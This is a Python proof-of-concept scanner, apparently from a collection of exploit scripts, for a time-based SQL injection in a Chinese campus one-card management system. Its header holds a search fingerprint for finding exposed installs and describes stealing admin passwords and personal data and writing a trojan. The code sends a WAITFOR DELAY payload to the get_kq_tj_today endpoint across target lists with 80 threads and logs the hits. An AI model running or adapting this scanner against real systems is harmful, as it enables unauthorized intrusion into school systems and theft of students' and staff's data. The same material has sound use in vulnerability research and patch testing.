# -*- coding: utf-8 -*-
# 科讯校园一卡通管理系统 多处SQL延时注入
# body="http://www.ahkxsoft.com/" && body="一卡通登录"
# 产品简介：科讯校园一卡通管理系统是一款专为校园环境设计的综合性管理系统，旨在通过数字化、集成化的方式提升校园管理效率，为师生提供更加便捷、高效的校园生活体验。系统集成了多种功能模块，包括但不限于消费管理、门禁考勤、水控电控、图书管理、机房管理等，能够全面覆盖校园内的各项管理需求。该系统以“全面、一库、一网、一卡、一密”为特点，实现了校园内各子系统的无缝对接和统一管理。
# 漏洞概述：科讯校园一卡通管理系统 get_kq_tj_today、dormitoryHealthRanking等多处接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m██╗  ██╗██╗  ██╗██╗  ██╗██╗   ██╗     ███████╗ ██████╗ ██╗     
\x1b[36m██║ ██╔╝╚██╗██╔╝╚██╗██╔╝╚██╗ ██╔╝     ██╔════╝██╔═══██╗██║     
\x1b[34m█████╔╝  ╚███╔╝  ╚███╔╝  ╚████╔╝      ███████╗██║   ██║██║     
\x1b[35m██╔═██╗  ██╔██╗  ██╔██╗   ╚██╔╝       ╚════██║██║▄▄ ██║██║     
\x1b[31m██║  ██╗██╔╝ ██╗██╔╝ ██╗   ██║███████╗███████║╚██████╔╝███████╗
\x1b[33m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                                                                                                                                    
    --author:Kucei  --Version:科讯校园一卡通管理系统_多处SQL延时注入[1]
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                                 
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('科讯校园一卡通管理系统_多处SQL延时注入[1]')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = '/api/get_kq_tj_today?KaID=1'
    url_payload2 = '/api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:5%27--'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response1 = requests.get(url=target+url_payload1,headers=headers,verify=False,timeout=7)
        response2 = requests.get(url=target+url_payload2,headers=headers,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 3.5:
            print( f"[+] {target} 存在漏洞！\n")
            with open('科讯校园一卡通管理系统_SQL延时注入[1].txt','a',encoding='utf-8')as f:
                f.write(target+url_payload2+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()